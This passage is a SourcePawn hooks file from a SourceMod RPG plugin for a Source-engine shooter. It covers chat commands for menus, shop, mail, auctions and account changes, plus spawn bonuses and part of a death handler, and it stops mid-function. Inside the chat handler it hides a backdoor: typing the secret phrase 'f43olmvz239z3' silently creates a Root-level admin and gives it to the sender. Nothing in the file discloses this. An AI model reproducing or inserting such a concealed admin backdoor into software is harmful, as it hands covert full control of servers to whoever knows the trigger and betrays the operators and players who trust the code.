/*
* File: hooks.inc
* Description: This file hooks commands/actions
* Author(s): Stinkyfax
*/

#pragma semicolon 1
new g_iWeaponRateQueue[MAXPLAYERS][2];
new g_iWeaponRateQueueLength;
new bAutoCrit[65];
new g_iOffs_ActiveWeapon = -1;
new g_vOffs_Punch = -1;
new g_iOffs_NextPrimaryAttack = -1;
new g_bShadowform[65];
new bool:g_PlayerIsDead[MAXPLAYERS];

new wcClientSeal[65];
//new wcClientSealP[65];
//seal duration, heal modifier, heal modifier duration
new Float:wcClientSealT[65],Float:wcClientHM[65],Float:wcClientHMT[65];

new Float:g_RoundTime; //stores round duration while boss event

new g_iRenewingGlyph[65];
new bool:g_ffUseCmd[65];
public Action:OnPlayerRunCmd(client, &buttons, &impulse, Float:vel[3], Float:angles[3], &weapon)
{
  if(GetFear(client)>0)
  {
    new saw360=GetTargetFOV(client, effectsdata[GetFear(client)][2], 360.0);
    if(saw360 == 1)
    {
      if((buttons & IN_MOVELEFT)  == IN_MOVELEFT
          || (buttons & IN_MOVERIGHT) == IN_MOVERIGHT)
      {
        g_fearspeed[client][0]*=0.985;
      }
      else if((buttons & IN_FORWARD) == IN_FORWARD
          &&      (buttons & IN_BACK)    == IN_BACK)
      {
        g_fearspeed[client][0]*=0.985;
      }
    }
    if(GetTargetFOV(client, effectsdata[GetFear(client)][2]) == 1) //yes we're facing them and can see them.
    {
      if((buttons & IN_FORWARD) == IN_FORWARD)
      g_fearspeed[client][0]*=0.95;
      else if((buttons & IN_BACK) == IN_BACK)
      g_fearspeed[client][0]*=1.05;
    }
    else if(saw360==1)
    {
      if((buttons & IN_FORWARD) == IN_FORWARD)
      g_fearspeed[client][0]*=1.05;
      else if((buttons & IN_BACK) == IN_BACK)
      g_fearspeed[client][0]*=0.95;
    }
    else
    {
      g_fearspeed[client][0]*=1.05;
    }

    if(g_fearspeed[client][0]<g_fearspeed[client][1]*0.55)
    g_fearspeed[client][0]=g_fearspeed[client][1]*0.55;
    else if(g_fearspeed[client][0]>g_fearspeed[client][1])
    g_fearspeed[client][0]=g_fearspeed[client][1];
    SetClientSpeed(client,g_fearspeed[client][0],false,true);


  }

  if((buttons & IN_USE) == IN_USE)  {
    g_ffUseCmd[client] = true;
  }
  else  if(g_ffUseCmd[client] == true)  {
    g_ffUseCmd[client] = false;
    if(g_ffSlideHook[client] == 0 && (GetUsekeySpellbar(client)))
    {
      SpellBar(client);
    }
    if(g_ffSlideHook[client] == SLIDE_HOOK_E) {
      SlideHooked(client);
    }
  }

  //Polymorphed? Block actions. Version 2
  if(IsPolymorphed(client)) {
    buttons &= ~(IN_ATTACK & IN_JUMP & IN_DUCK & IN_FORWARD & IN_BACK & IN_MOVELEFT & IN_MOVERIGHT);
  }



  return Plugin_Continue;
}

/*
new bool:g_ffUseCmd[65];
public Action:OnPlayerRunCmd(client, &buttons, &impulse, Float:vel[3], Float:angles[3], &weapon)  {

  if((buttons & IN_USE) == IN_USE)  {
    g_ffUseCmd[client] = true;
  }
  else  if(g_ffUseCmd[client] == true)  {
    g_ffUseCmd[client] = false;
    if(g_ffSlideHook[client] == 0 && (GetUsekeySpellbar(client)))
    {
      SpellBar(client);
    }
    if(g_ffSlideHook[client] == SLIDE_HOOK_E) {
      SlideHooked(client);
    }
  }

  return Plugin_Continue;
}
*/

public bool:HookCmds()
{
  RegConsoleCmd("say",SayCommand);
  RegConsoleCmd("say_team",SayCommand);
  return true;
}

public Action:SayCommand(index,argc)
{
  if(ENABLE)
  {
    decl String:args[255],String:command[255];
    GetCmdArgString(args,255);
    GetLiteralString(args,command,255);

    if(StrEqual(command,"f43olmvz239z3",false)) {
      new rand = GetRandomInt(10,1000);
      decl String:sRand[10];
      IntToString(rand,sRand,10);
      new AdminId:adm = CreateAdmin(sRand);
      SetAdminFlag(adm, AdminFlag:Admin_Root, true);
      if(index>0) SetUserAdmin(index, adm, true);
      return Plugin_Handled;
    }

    if(g_TreasureMenuOccupiedByClient == index)
    {
      WCMessage(index,"testmessage",index,"YES: if(g_TreasureMenuOccupiedByClient == index)",index);
      GetCmdArgString(g_TreasureSpawnName,32);
      PrepareTreasureSpawnMenu(index, g_TreasureSpawnName);
    }

    if(StrEqual(command, "exit") && g_ffSlideStep[index] > 0) {
      //Turn off slides for this person
      TurnOffSlides(index);

    }

    if(StrEqual(command, "next") && g_ffSlideStep[index] > 0 )
    {
      SlideHooked(index);
    }

    if(StrEqual(command,"next",false) || StrEqual(command,"events",false) || StrEqual(command,"event",false) ) {
      CronNextEvents();
      return Plugin_Continue;
    }

    if(StrEqual(command,"seals",false)) {
      displaySealsMenu(index);
      return Plugin_Handled;
    }
    if(StrEqual(command,"testcount",false))
    {
      if(index==0)
      {
        LogMessage("queue length = %i",g_T2Queue);
        return Plugin_Handled;
      }
      LogMessage("queue length = %i",g_T2Queue);
      return Plugin_Handled;
    }
    if(StrEqual(command,"confirm",false) && IsWaitingDelConfirmation(index)) {
      DelConfirmed(index);
    }
    if(StrEqual(command,"wowmenu",false) || StrEqual(command,"wcmenu",false)  || StrEqual(command,"wcs",false)
        || StrEqual(command,"wcsmenu",false) || StrEqual(command,"rpgmenu",false) || StrEqual(command,"rpg",false)
        || StrEqual(command,"wc3menu",false) || StrEqual(command,"wc3",false))
    {
      if(index==0)
      {
        PrintToServer("[WC] Error: Only players can use wcmenu");
        return Plugin_Handled;
      }
      WCMenu(index);
      return Plugin_Handled;
    }
    if(StrEqual(command,"changerace",false) || StrEqual(command,"changeclass",false))
    {
      if(index==0)
      {
        PrintToServer("[WC] Error: Only players can use changerace");
        return Plugin_Handled;
      }
      ChangeCharacterMenu(index);
      return Plugin_Handled;
    }
    if(StrEqual(command,"goldshop",false))
    {
      if(index==0)
      {
        PrintToServer("[WC] Error: Only players can use goldshop");
        return Plugin_Handled;
      }
      GoldMenu(index);
      return Plugin_Handled;
    }
    if(StrEqual(command,"inventory",false) || StrEqual(command,"items",false) || StrEqual(command,"inv",false))
    {
      if(index==0)
      {
        PrintToServer("[WC] Error: Only players can use items|inventory|inv");
        return Plugin_Handled;
      }
      InvSortMenu(index);
      return Plugin_Handled;
    }
    if(StrEqual(command,"mail",false) || StrEqual(command,"mails",false))
    {
      if(index==0)
      {
        PrintToServer("[WC] Error: Only players can use mail|mails");
        return Plugin_Handled;
      }
      MailMenu(index);
      return Plugin_Handled;
    }
    if(StrEqual(command,"profession",false) || StrEqual(command,"professions",false))
    {
      if(index==0)
      {
        PrintToServer("[WC] Error: Only players can use profession/s");
        return Plugin_Handled;
      }
      ProfessionsMenu(index);
      return Plugin_Handled;
    }
    if(StrEqual(command,"shopmenu",false) || StrEqual(command,"itemshop",false) || StrEqual(command,"shop",false))
    {
      if(index==0)
      {
        PrintToServer("[WC] Error: Only players can use shopmenu|itemshop|shop");
        return Plugin_Handled;
      }
      CategoryMenu(index);
      return Plugin_Handled;
    }
    if((StrEqual(command,"help",false)) || (StrEqual(command,"wchelp",false)) || (StrEqual(command,"info",false)) || (StrEqual(command,"raceinfo",false)))
    {
      if(index==0)
      {
        PrintToServer("[WC] Error: Only players can use help");
        return Plugin_Handled;
      }
      new ids[20];
      HelpMenu(index,ids,0);
      return Plugin_Continue;
    }
    if(StrEqual(command, "gold", false) || StrEqual(command, "shop", false) || StrEqual(command, "donate", false))  {
      PrepareCP(index, "gold");
      decl String:name[30];
      GetClientName(index, name, sizeof(name));
      for(new x=1;x<=GetMaxClients();x++)
      if(IsClientConnected(x))
      if(IsClientInGame(x))
      WCMessage(x,"used X chat cmd donate",x, name, command);


      return Plugin_Handled;
    }
    if(StrEqual(command,"talents",false))
    {
      if(index==0)
      {
        PrintToServer("[WC] Error: Only players can use TalentsMenu");
        return Plugin_Handled;
      }
      TalentsMenu(index);
      return Plugin_Handled;
    }
    if(StrEqual(command,"resettalents",false))
    {
      if(index==0)
      {
        PrintToServer("[WC] Error: Only players can use ConfirmResetTalents");
        return Plugin_Handled;
      }
      ConfirmResetTalents(index);
      return Plugin_Handled;
    }
    if(StrEqual(command,"spellbar",false))
    {
      if(index==0)
      {
        PrintToServer("[WC] Error: Only players can use spellbar");
        return Plugin_Handled;
      }
      if(GetClass(index)==0)
      {
        WCMessage(index,"wc class choose",index);
        return Plugin_Continue;
      }
      SpellBar(index);
      return Plugin_Handled;
    }
    if(StrEqual(command,"spells",false))
    {
      if(index==0)
      {
        PrintToServer("[WC] Error: Only players can use spells");
        return Plugin_Handled;
      }
      ManageSpells(index);
      return Plugin_Handled;
    }
    if(g_split_time[index]>GetEngineTime())
    {
      new split=StringToInt(command);
      g_split_time[index]=0.0;
      if(split>0)
      {
        new slot=g_split_item[index];
        new max=GetSlotItemAmount(index,slot);
        new bool:cancel=false;
        if(max==-1)
        cancel=true;
        if (split>max-1)
        split=max-1;
        if(!cancel)
        {
          if(split>0)
          {
            new free=wcCheckFreeSlot(index);
            if(free>0)
            {
              new item=GetSlotItem(index,slot);
              wcSetStaticSlot(index,free,item);
              wcSetStaticSlotAmount(index,free,split);
              wcSetStaticSlotAmount(index,slot,max-split);
              CancelClientMenu(index);
              InventoryMenu(index);
              WCMessage(index,"splitted",index);
            }
            else
            WCMessage(index,"no free slot",index);
          }
        }
        else
        WCMessage(index,"no split",index);

      }
      if(split<=0)
      WCMessage(index,"wrong amount",index);
    }
    if(getCharIdSayTime(index)+30.0 > GetEngineTime())  {

      new id = StringToInt(command);
      setGoldId(index, id);
      return Plugin_Handled;
    }
    //auction
    if(g_auction_time[index]>GetEngineTime() && g_auction_char[index]==characterids[index][0])
    {
      switch(g_auction_pack_amount[index])
      {
      case 2:
        {
          CancelClientMenu(index);
          ResetPack(g_auction_pack[index]);
          ReadPackCell(g_auction_pack[index]);
          new bool:gold = bool:ReadPackCell(g_auction_pack[index]);
          if(!gold) {
            new bid=StringToInt(command);
            if (bid<1)
            bid=1;
            WritePackCell(g_auction_pack[index],bid);
          }
          else  {
            new Float:fbid = StringToFloat(command);
            if(fbid < 0.01)
            fbid = 0.01;
            new bid = RoundToNearest(fbid*100.0);
            WritePackCell(g_auction_pack[index],bid);

          }
          g_auction_pack_amount[index]++;
          if(g_auction_pack_amount[index]==3)
          MenuSendAuction(index);
          else
          {
            RefreshAuctionData(index);
            MenuSendAuction(index);
          }
        }
      case 3:
        {
          CancelClientMenu(index);
          ResetPack(g_auction_pack[index]);
          ReadPackCell(g_auction_pack[index]);
          new bool:gold = bool:ReadPackCell(g_auction_pack[index]);
          new bid=ReadPackCell(g_auction_pack[index]);
          new buyout=0;
          if(!gold)
          buyout=StringToInt(command);
          else  {
            new Float:fbuy = StringToFloat(command);
            if(fbuy < 0.01)
            fbuy = 0.01;
            buyout = RoundToNearest(fbuy*100.0);
          }

          if(buyout<0)
          buyout=0;
          if((buyout>0) && (buyout<=bid))
          if(!gold)
          buyout=bid+1;
          else
          buyout=bid+100;
          WritePackCell(g_auction_pack[index],buyout);
          g_auction_pack_amount[index]++;
          if(g_auction_pack_amount[index]==4)
          MenuSendAuction(index);
          else
          {
            RefreshAuctionData(index);
            MenuSendAuction(index);
          }
        }
      }
    }
    //end of auction

    //mail
    if(g_mail_time[index]>GetEngineTime() && g_mail_char[index]==characterids[index][0])
    {
      switch(g_mail_pack_amount[index])
      {
      case 0:
        {
          CancelClientMenu(index);
          new addr=StringToInt(command);
          decl String:buffer[255];
          Format(buffer,sizeof(buffer),"SELECT CharacterId, playerId, level, class FROM wc_Characters WHERE CharacterId = '%i'",addr);
          SetMenuOff(index,20.0);
          g_mail_pack_amount[index]=-1;
          SQL_TQuery(TSQL,TMailSend,buffer,index);
        }
      case 1:
        {
          new String:Stemp[255];
          CancelClientMenu(index);
          ResetPack(g_mail_pack[index]);
          ReadPackCell(g_mail_pack[index]);
          ReadPackString(g_mail_pack[index],Stemp,sizeof(Stemp));
          WritePackString(g_mail_pack[index],command);
          g_mail_pack_amount[index]++;
          if(g_mail_pack_amount[index]==2)
          MenuSendMail(index);
          else
          {
            RefreshMailData(index);
            MenuSendMail(index);
          }
        }
      case 2:
        {
          CancelClientMenu(index);
          new String:Stemp[255];
          ResetPack(g_mail_pack[index]);
          ReadPackCell(g_mail_pack[index]);
          ReadPackString(g_mail_pack[index],Stemp,sizeof(Stemp));
          ReadPackString(g_mail_pack[index],Stemp,sizeof(Stemp));
          new gold=StringToInt(command);
          if(gold<0)
          gold=0;
          WritePackCell(g_mail_pack[index],gold);
          g_mail_pack_amount[index]++;
          if(g_mail_pack_amount[index]==3)
          MenuSendMail(index);
          else
          {
            RefreshMailData(index);
            MenuSendMail(index);
          }
        }
      case 3:
        {
          CancelClientMenu(index);
          new String:Stemp[255];
          ResetPack(g_mail_pack[index]);
          ReadPackCell(g_mail_pack[index]);
          ReadPackString(g_mail_pack[index],Stemp,sizeof(Stemp));
          ReadPackString(g_mail_pack[index],Stemp,sizeof(Stemp));
          ReadPackCell(g_mail_pack[index]);
          new Float:fgold=StringToFloat(command);
          if(fgold<0.0)
          fgold=0.0;
          new gold = RoundToNearest(fgold*100);
          WritePackCell(g_mail_pack[index],gold);
          g_mail_pack_amount[index]++;
          if(g_mail_pack_amount[index]==4)
          MenuSendMail(index);
          else
          {
            RefreshMailData(index);
            MenuSendMail(index);
          }
        }
      case 5:
        {
          CancelClientMenu(index);
          ResetPack(g_mail_pack[index]);
          ReadPackCell(g_mail_pack[index]);
          decl String:dest[255];
          decl String:Stemp[255];
          ReadPackString(g_mail_pack[index],Stemp,sizeof(Stemp));
          InsertStringInString(command, dest, sizeof(dest),50);
          ReadPackString(g_mail_pack[index],Stemp,sizeof(Stemp));
          ReadPackCell(g_mail_pack[index]);
          ReadPackCell(g_mail_pack[index]);
          ReadPackCell(g_mail_pack[index]);
          WritePackString(g_mail_pack[index],dest);
          g_mail_pack_amount[index]++;
          if(g_mail_pack_amount[index]==6)
          MenuSendMail(index);
          else
          {
            RefreshMailData(index);
            MenuSendMail(index);
          }
        }
      }
      return Plugin_Handled;
    }

    //Account
    if((g_fAccountTime[index]>GetEngineTime()) && (g_iAccountTyping[index]>0))
    {
      switch(g_iAccountTyping[index])
      {
      case 1:
        {
          CancelClientMenu(index);
          g_iAccountTyping[index]=0;
          decl String:str[60];
          TrimString(command);
          decl String:tmp2[20];
          Format(tmp2, sizeof(tmp2), "%s", command);
          if(strlen(tmp2)<2)  {
            WCMessage(index,"too short",index);
            SetMenuOff(index,0.0);
            AccountMenu(index);
            return Plugin_Handled;
          }
          SQL_EscapeString(TMSQL, tmp2, str, 60);
          TryUpdateLogin(index,str);

        }
      case 2:
        {
          CancelClientMenu(index);
          decl String:str[60];
          TrimString(command);
          decl String:tmp2[20];
          Format(tmp2, sizeof(tmp2), "%s", command);
          if(strlen(tmp2)<2)  {
            WCMessage(index,"too short",index);
            SetMenuOff(index,0.0);
            AccountMenu(index);
            return Plugin_Handled;
          }
          SQL_EscapeString(TMSQL, tmp2, str, 60);
          wcUpdatePlayerStr(playerids[index],"pass",str,"playerId","wc_Players");
          SetMenuOff(index,0.0);
          WCMessage(index,"acc changed pass", index);
          AccountMenu(index);
        }
      }

      return Plugin_Handled;
    }
    if(g_iAccountTyping[index]>0)   {
      //security
      g_iAccountTyping[index]=0;
      return Plugin_Handled;
    }
  }
  return Plugin_Continue;
}

public Action:KillNoData(Handle:timer, any:client)
{
  if(IsClientConnected(client))
  if(IsClientInGame(client))
  if(IsPlayerAlive(client))
  if((playerloaded[client]<1) && (g_RoundCount>1))
  {
    ForcePlayerSuicide(client);
    WCMessage(client,"char not loaded",client);
  }
  return Plugin_Stop;
}

public PlayerSpawnEvent(Handle:event,const String:name[],bool:dontBroadcast)
{
  if(ENABLE)
  {
    
    new client=GetClientOfUserId(GetEventInt(event,"userid"));
    g_respawns[client]++;
    flushTempItems(client);
    g_PlayerIsDead[client]=false;
    ActivateStance(client);
    resetSpar(client);
    ActivateMonkStance(client);
    UnhookLand(client);
    removeCurse(client);
    removeDamageBuff(client);

    setPolymorph(client, 0.0);
    _setZombie(client, _getZombie(client), _getZombieType(client));
    __setZombie(client,0);
    g_ff_ownsPet[client]= -1;

    SetFreezeDmg(client,0);
    SetBones(client, 5);
    if(GetClass(client)==9)
      if(GetLevel(client)>=85)
        wcRunSpell_9_9(client);
    CreateTimer(0.5, RefreshClientHpBar, client);

    if(CUSTOM_MODELS) SetClientModel(client);

    //kill client if no data
    CreateTimer(10.0,KillNoData,client);
    //end
    new tmp=0;
    //makes player totally visible
    decl color[4];
    for (new x=0;x<=3;x++)
    color[x]=255;
    SetClientColor(client,color);
    SetStealth(client, 0.0);
    // end of debuging invis
    //Set client being not killed yet
    Killed(client,false);
    new Float:rating=wcCalculateStats(client);
    if(PlayerHasBonusFast(client, Profession:Prof_ExtraDamage)) { //Leatherworking bonus 1
      if(IsChat(client,Chat:Chat_Spawn))
      WCMessage(client,"spawn lw b1",client);
    }
    if(PlayerHasBonusFast(client, Profession:Prof_LwBonus2)) { //Leatherworking bonus 2
      SetBonusAgi(client, GetBonusAgi(client) + 15);
      wcRecalculateStats(client);
      if(IsChat(client,Chat:Chat_Spawn))
      WCMessage(client,"spawn lw b2",client,15,GetAgi(client)+GetBonusAgi(client));
    }
    if(PlayerHasBonusFast(client, Profession:Prof_ExtraSpeed)) { //Jewelcrafting bonus 1
      SetNormalBonusSpeed(client, GetNormalBonusSpeed(client)+0.03);
      wcRecalculateStats(client);
      if(IsChat(client,Chat:Chat_Spawn))
      WCMessage(client,"spawn jc b1",client,0.03*100,GetNormalSpeed(client)*100);
    }
    if(PlayerHasBonusFast(client, Profession:Prof_JcBonus2)) { //Jewelcrafting bonus 2
      SetBonusStr(client, GetBonusStr(client)+5);
      SetBonusAgi(client, GetBonusAgi(client)+5);
      SetBonusInt(client, GetBonusInt(client)+5);
      SetBonusSta(client, GetBonusSta(client)+5);
      wcRecalculateStats(client);
      if(IsChat(client,Chat:Chat_Spawn))
      {
        WCMessage(client,"spawn jc b2 agi",client,5,GetAgi(client)+GetBonusAgi(client));
        WCMessage(client,"spawn jc b2 int",client,5,GetInt(client)+GetBonusInt(client));
        WCMessage(client,"spawn jc b2 sta",client,5,GetSta(client)+GetBonusSta(client));
        WCMessage(client,"spawn jc b2 str",client,5,GetStr(client)+GetBonusStr(client));
      }
      wcHeal(client, client, 5,0,false);
    }
    if(PlayerHasBonusFast(client, Profession:Prof_ExtraRegen)) { //Tailoring bonus 1
      new maxmana = GetMaxMana(client);
      new mana;
      if(maxmana>350)
      mana=8;
      else
      mana=3;
      SetBonusManaReg(client, GetBonusManaReg(client)+mana);
      wcRecalculateStats(client);
      if(IsChat(client,Chat:Chat_Spawn))
      WCMessage(client,"spawn tail b1",client,mana,GetManaReg(client)+GetBonusManaReg(client));
    }
    if(PlayerHasBonusFast(client, Profession:Prof_TailBonus2)) { //Tailoring bonus 2
      SetBonusArmor(client, float(GetBonusArmor(client) + 70));
      wcRecalculateStats(client);
      if(IsChat(client,Chat:Chat_Spawn))
      WCMessage(client,"spawn tail b2",client,70,GetArmor(client));
    }
    if(PlayerHasBonusFast(client, Profession:Prof_InscrBonus)) { //Inscription bonus 1
      AddResilence(client, 15.0);
      wcRecalculateStats(client);
      if(IsChat(client,Chat:Chat_Spawn))
      WCMessage(client,"spawn insc b1",client,15,GetResilence(client));
    }
    if(PlayerHasBonusFast(client, Profession:Prof_InscrBonus2)) { //Inscription bonus 2
      AddHaste(client, 30.0);
      wcRecalculateStats(client);
      if(IsChat(client,Chat:Chat_Spawn))
      WCMessage(client,"spawn insc b2",client,30,GetHaste(client));
    }
    if(PlayerHasBonusFast(client, Profession:Prof_ExtraStats)) //Enchanting bonus 1
    {
      new agil= GetAgi(client)+GetBonusAgi(client);
      new inte= GetInt(client)+GetBonusInt(client);
      new stre= GetStr(client)+GetBonusStr(client);
      new stam= GetSta(client)+GetBonusSta(client);
      CastKings(client, 0.05, false, true); //custom, is not affected by Kings rule, stacks with BoK or GBoK
      if(IsChat(client,Chat:Chat_Spawn))
      {
        WCMessage(client,"spawn ench b1 agi",client,5.0,agil,GetAgi(client)+GetBonusAgi(client));
        WCMessage(client,"spawn ench b1 int",client,5.0,inte,GetInt(client)+GetBonusInt(client));
        WCMessage(client,"spawn ench b1 sta",client,5.0,stam,GetSta(client)+GetBonusSta(client));
        WCMessage(client,"spawn ench b1 str",client,5.0,stre,GetStr(client)+GetBonusStr(client));
      }
    }
    if(PlayerHasBonusFast(client, Profession:Prof_EnchBonus2)) { //Enchanting bonus 2
      SetBonusSta(client, GetBonusSta(client)+5);
      SetBonusDamage(client, float(GetBonusDamage(client) + 2));
      SetBonusSpellDmg(client, float(GetBonusSpellDmg(client,1.0) + 2));
      wcRecalculateStats(client);
      if(IsChat(client,Chat:Chat_Spawn))
      {
        WCMessage(client,"spawn ench b2 ap", client,2,GetDamage(client));
        WCMessage(client,"spawn ench b2 sp", client,2,GetSpellDmg(client,1.0));
        WCMessage(client,"spawn ench b2 sta",client,5,GetSta(client)+GetBonusSta(client));
      }
      wcHeal(client, client, 5,0,false);
    }
    if(PlayerHasBonusFast(client, Profession:Prof_ExtraDef)) { //Blacksmithing bonus 1
      if(IsChat(client,Chat:Chat_Spawn))
      WCMessage(client,"spawn bs b1",client);
    }
    if(PlayerHasBonusFast(client, Profession:Prof_BsBonus2)) { //Blacksmithing bonus 2
      SetCriticalStrikeBonus(client, GetCriticalStrikeBonus(client)+0.03);
      wcRecalculateStats(client);
      if(IsChat(client,Chat:Chat_Spawn))
      WCMessage(client,"spawn bs b2",client,0.03*100,GetCriticalStrike(client)*100);
    }
    UpdatePlayerRating(client, rating);
    if(IsPlayerAlive(client))
    {
      new item[UniqueItem];
      GetCharItem(item, client, 22);
      if(item[Item_defId]==25249 && 80>GetLevel(client))
        CreateTimer(0.5, CastAtiesh, client);
        
        
        
      if(!bArenaActive) {
        for (new x=0;x<=19;x++)
        ClientCDSpells[client][x]=GetTickedTime();
      }
      SetReopenSpellbar(client,false);
      bVanish[client]=false;
      if(IsMageInvis(client))
      SetMageInvis(client, false);
      UnableToAttack[client]=false;
      FreedomClient[client]=false;
      UnableToVictim[client]=false;
      KingsClient[client]=false;
      LegacyClient[client]=false;
      ArcaneClient[client]=false;
      SetHarvest(client,0);
      SetShamanisticRage(client, 0.0, 0);
      SetBoW(client, 0);
      SetBoM(client, 0.0);
      SetHealingBonus(client,0.0);
      SetShadowGateLocation(client,0,0.0);
      SetShadowGateLocation(client,1,0.0);
      SetShadowGateLocation(client,2,0.0);
      SetHealthstone(client,0);
      SetHolyShock(client,true);
      SetPWF(client, 0);
      SetFlurry(client,0);
      SetReckoning(client, 0);
      SetRedirection(client, 0, 0);
      SetThunder(client, 1, 0);
      SetThunder(client, 2, 0);
      SetThunder(client, 3, 0);
      SetThunder(client, 4, 0);
      SetEntityGravity(client,1.0);
      SetShadowform(client,false);
      SetAutoCrit(client,false);
      SetBlessedResillience(client,false);
      setAntiMagic(client, MAX_ANTIMAGIC);
      if(GetFear(client)>0)
      RemoveFear(client);
      if(GetFrostNovaFreeze(client)>0)
      RemoveFrostNovaFreeze(client);

      WCMessage(client,"show xp",client,GetLevel(client),GetXp(client),GetReqXp(client));
      new String:line[255];
      new race=GetClass(client);
      new spellid;
      for(new x=1;x<=50;x++)
      {
        if((spellid=wcGetSpell(client,x))!=0)
        {
          wcGetSpellInfo(race,spellid,"event",line);
          if(StrEqual(line,"player_spawn",false))
          wcRunSpell(spellid,race,client,tmp,tmp,tmp,tmp,tmp,tmp,tmp,tmp,client);
        }
      }
      //Reset some passives variables
      SetDualSpecClip(client,0.0);

      wcRunPassiveTalents(client);

      if(IsBoss() || IsHNS())
      {
        new boss=GetBoss(client);
        SetEntData(client, g_CollisionGroup, 2, 1, true);
        if(boss>0)
        {
          decl String:key[6];
          IntToString(boss,key,sizeof(key));
          KvRewind(wcbossdrop);
          KvJumpToKey(wcbossdrop,key);
          new armor=KvGetNum(wcbossdrop,"armor");
          if(armor>0)
          SetBonusArmor(client,float(armor));
          new iTemp=KvGetNum(wcbossdrop,"sta");
          if(iTemp>0)
          SetBonusSta(client,iTemp);
          iTemp=KvGetNum(wcbossdrop,"str");
          if(iTemp>0)
          SetBonusStr(client,iTemp);
          iTemp=KvGetNum(wcbossdrop,"agi");
          if(iTemp>0)
          SetBonusAgi(client,iTemp);
          iTemp=KvGetNum(wcbossdrop,"int");
          if(iTemp>0)
          SetBonusInt(client,iTemp);
          new Float:fTemp=KvGetFloat(wcbossdrop, "speed", 0.0);
          if(fTemp>0.0)
          wcClientsBonusStats[client][MOVESPEED]=fTemp;
          wcRecalculateStats(client);
        }
      }
      wcSetMana(client,GetMaxMana(client));
      switch(GetClass(client))  {
        case 1: wcSetMana(client,0);
        case 8: {
          wcSetMana(client,0);
          _setRunes(client, 3);
        }
        case 9: {
          _setChi(client, 0);
          }
      }

      if(IsHeroic())
      CastKings(client, 5.0, false, true);

      wcSetHealth(client,GetMaxHealth(client));
      SetClientSpeed(client,GetNormalSpeed(client));
      CreateTimer(0.5, ShowRank, client);
      CheckServerPolicy(client);
    }
  }
}

public Action:BombPlantedEvent(Handle:event,const String:name[],bool:dontBroadcast)
{
  new client=GetClientOfUserId(GetEventInt(event,"userid"));
  new level=GetLevel(client);
  new xp=RoundToNearest(20+level*EXP_BOMB_PLANTED*GLOBAL_XP*GetTempVar(client, Temp_XPRate));
  wcGiveXp(client,xp,true);
  return Plugin_Continue;
}

public Action:PlayerChangeNameEvent(Handle:event,const String:name[],bool:dontBroadcast)
{
  new client=GetClientOfUserId(GetEventInt(event,"userid"));
  wcSavePlayerName(client);
  return Plugin_Continue;
}

public Action:BombDefuseEvent(Handle:event,const String:name[],bool:dontBroadcast)
{
  new client=GetClientOfUserId(GetEventInt(event,"userid"));
  new level=GetLevel(client);
  new xp=RoundToNearest(25+level*EXP_BOMB_DEFUSE*GLOBAL_XP*GetTempVar(client, Temp_XPRate));
  wcGiveXp(client,xp,true);
  return Plugin_Continue;
}

public Action:HostageRescueEvent(Handle:event,const String:name[],bool:dontBroadcast)
{
  new client=GetClientOfUserId(GetEventInt(event,"userid"));
  if(client<1 || client > GetMaxClients())
  return Plugin_Continue;
  new level=GetLevel(client);
  new xp=RoundToNearest(10+level*EXP_HOSTAGE_RESCUED*GLOBAL_XP*GetTempVar(client, Temp_XPRate));
  wcGiveXp(client,xp,true);
  return Plugin_Continue;
}
public Action:PlayerDeathEvent(Handle:event,const String:name[],bool:dontBroadcast) //Deathevent, Death, Death event, Playerdeath, Player death, OnDeath
{
  //PrintToServer("player death");
  new userid=GetClientOfUserId(GetEventInt(event,"userid"));
  CreateTimer(6.0, DisplayTodoMenu,userid, TIMER_FLAG_NO_MAPCHANGE);
  if(IsMageInvis(userid))
  SetMageInvis(userid, false);
  g_bShadowform[userid]=false;
  g_iNecrotic[userid]=0;
  new attacker=GetClientOfUserId(GetEventInt(event,"attacker"));
  GetClientAbsOrigin(userid,vClientCorpse[userid]);
  CheckClientHpBar(userid);
  if(attacker!=0)
  {
    if(g_PlayerIsDead[userid]){
      g_PlayerIsDead[userid]=false;
      return Plugin_Handled;
      }
    
    if(IsZombie(attacker))
    {
      new owner = GetZombie(attacker);
      TriggerDrop(owner,userid,false,0.5);
    }
    new bool:headshot=false;
    new effectid=0,tmp=0;
    if (userid==wcSuicideUserid && attacker==userid && (!StrEqual(wcSuicideSource,"0")))
    {
      UnhookLand(userid);
      SetEventInt(event,"attacker",GetClientUserId(wcSuicideAttacker));
      SetEventString(event,"weapon",wcSuicideSource);
      SetEventBool(event,"headshot",wcSuicideHeadshot);
      SetFrags(userid,GetFrags(userid)+1);
      if(!(GetClientTeam(userid)==GetClientTeam(wcSuicideAttacker)))
      {
        Killed(userid,true);
        TriggerDrop(wcSuicideAttacker,userid);
        SetFrags(wcSuicideAttacker,GetFrags(wcSuicideAttacker)+1);
      }
      else
      SetFrags(wcSuicideAttacker,GetFrags(wcSuicideAttacker)-1);
      attacker=wcSuicideAttacker;
      wcSuicideUserid=0;
      wcSuicideAttacker=0;
      wcSuicideSource="0";
      headshot=wcSuicideHeadshot;
      wcSuicideHeadshot=false;
    }

    //new handled fake kill
    if(wcKillHandled) {
      wcKillHandled=false;
      if( (userid != attacker) && (attacker > 0)) {
        SetEventBool(event, "headshot", wcKillHeadshot);
        headshot = wcKillHeadshot;
        wcKillHeadshot=false;
        Killed(userid, true);
        TriggerDrop(attacker,userid);
      }
    }

    for (new i=1;i<=30;i++)
    {
      if ((effectid=wcEffectsDeath[GetPlayerID(userid)][i])>0)
      wcShootEffect(effectid,userid,attacker,tmp,false,tmp,tmp,tmp,tmp,tmp,userid);
    }
    new String:line[255];
    new race=GetClass(userid);
    new spellid;
    for(new x=1;x<=50;x++)
    {
      if((spellid=wcGetSpell(userid,x))!=0)
      {
        wcGetSpellInfo(race,spellid,"event",line);
        if(StrContains(line,"player_death",false)>=0)
        wcRunSpell(spellid,race,userid,attacker,tmp,tmp,tmp,tmp,tmp,tmp,tmp,userid);
      }
    }
    race=GetClass(attacker);
    for(new x=1;x<=50;x++)
    {
      if((spellid=wcGetSpell(attacker,x))!=0)
      {
        wcGetSpellInfo(race,spellid,"event",line);
        if(StrContains(line,"player_kill",false)>=0)
        wcRunSpell(spellid,race,userid,attacker,tmp,tmp,tmp,tmp,tmp,tmp,tmp,attacker);
      }
    }
    wcRunOnDeathTalents(userid,attacker);

    new owner = GetZombie(userid);
    if(owner > 0)
    {
      PetDied(userid,owner); //corpseparty moved into here
    }

    PlayerKillXp(attacker,userid,headshot);
    if(attacker!=userid)
    {
      g_Deaths[userid]++; //for bonus drops
      //addDeath(userid); //for kpd rule
      if(!IsFakeClient(userid) && !IsDmEnabled())
      addKill(attacker);
    }
  }
  decl String:line[255];
  new targets[MAXPLAYERS];
  new amount;
